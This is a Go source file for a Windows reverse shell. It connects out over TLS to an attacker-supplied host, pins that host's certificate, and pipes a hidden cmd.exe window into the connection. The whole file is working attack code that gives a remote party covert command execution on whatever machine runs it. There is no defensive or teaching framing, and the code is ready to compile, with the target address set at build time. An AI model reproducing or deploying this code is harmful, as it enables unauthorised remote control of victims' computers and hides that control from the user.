package main

import (
	"bytes"
	"crypto/sha256"
	"crypto/tls"
	"encoding/hex"
	"net"
	"os"
	"os/exec"
	"strings"
	"syscall"
)

// go build variables
var (
	connectString string
	fingerPrint   string
)

// Spawn Shell
func getShell() *exec.Cmd {
	cmd := exec.Command("cmd.exe")
	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	return cmd
}

// Select shell according to os type
func runShell(conn net.Conn) {
	var cmd *exec.Cmd = getShell()
	cmd.Stdout = conn
	cmd.Stderr = conn
	cmd.Stdin = conn
	cmd.Run()
}

// Certificate pinning
func checkKeyPin(conn *tls.Conn, fingerprint []byte) (bool, error) {
	valid := false
	connState := conn.ConnectionState()
	for _, peerCert := range connState.PeerCertificates {
		hash := sha256.Sum256(peerCert.Raw)
		if bytes.Equal(hash[0:], fingerprint) {
			valid = true
		}
	}
	return valid, nil
}

// Initiate reverse connection
func reverse(connectString string, fingerprint []byte) {
	var (
		conn *tls.Conn
		err  error
	)
	config := &tls.Config{InsecureSkipVerify: true}
	if conn, err = tls.Dial("tcp", connectString, config); err != nil {
		os.Exit(1)
	}
	defer conn.Close()

	if ok, err := checkKeyPin(conn, fingerprint); err != nil || !ok {
		os.Exit(1)
	}

	runShell(conn)
}

func main() {
	// Check if go build variables are declared
	if connectString != "" && fingerPrint != "" {
		fprint := strings.Replace(fingerPrint, ":", "", -1)
		bytesFingerprint, err := hex.DecodeString(fprint)
		if err != nil {
			os.Exit(1)
		}
		reverse(connectString, bytesFingerprint)
	}
}
